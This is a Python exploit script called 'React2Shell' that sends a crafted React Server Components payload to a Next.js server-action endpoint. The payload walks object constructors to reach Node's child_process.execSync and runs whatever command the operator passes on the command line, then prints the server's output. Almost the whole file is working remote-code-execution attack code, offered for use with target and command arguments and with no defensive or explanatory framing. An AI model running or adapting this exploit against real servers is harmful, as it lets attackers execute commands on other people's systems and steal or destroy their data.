import requests
import json
import argparse

def build_payload(command_input):
    # Automatically convert input to a safe JS string
    js_expression = json.dumps(str(command_input))

    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': (
    "console.log("
    "Function('return process')()"
    ".mainModule.require('child_process')"
    f".execSync(`{js_expression}`).toString()"
    ")//"
),
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    }

def sanitize_command(cmd):
    if not (cmd.startswith('"') and cmd.endswith('"')):
        cmd = f'"{cmd}"'
    return cmd


def send_rsc(base_url, payload):
    files = {k: (None, json.dumps(v)) for k, v in payload.items()}
    response = requests.post(
        base_url,
        headers={"next-action": "x"},
        files=files
    )
    print("Status:", response.status_code)
    print(response.text)



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="React2Shell")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g. http://localhost:3000)")
    parser.add_argument("-c", "--command", required=True, help="Command to Execute on the Target")
    

    

    banner = """

     /$$$$$$$                                  /$$      /$$$$$$   /$$$$$$  /$$                 /$$ /$$
   | $$__  $$                                | $$     /$$__  $$ /$$__  $$| $$                | $$| $$
    | $$  \\ $$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$  |__/  \\ $$| $$  \\__/| $$$$$$$   /$$$$$$ | $$| $$
    | $$$$$$$/ /$$__  $$ |____  $$ /$$_____/|_  $$_/    /$$$$$$/|  $$$$$$ | $$__  $$ /$$__  $$| $$| $$
    | $$__  $$| $$$$$$$$  /$$$$$$$| $$        | $$     /$$____/  \\____  $$| $$  \\ $$| $$$$$$$$| $$| $$
    | $$  \\ $$| $$_____/ /$$__  $$| $$        | $$ /$$| $$       /$$  \\ $$| $$  | $$| $$_____/| $$| $$
    | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$$  |  $$$$/| $$$$$$$$|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$
    |__/  |__/ \\_______/ \\_______/ \\_______/   \\___/  |________/ \\______/ |__/  |__/ \\_______/|__/|__/
                                                                                                      
                                                                                                      
                                                                                                                                                                                             
    @shyambhanushali @nickvourd                                                                                              
    """

    print (banner)
    args = parser.parse_args()
    payload = build_payload(sanitize_command(args.command))
    send_rsc(args.target, payload)
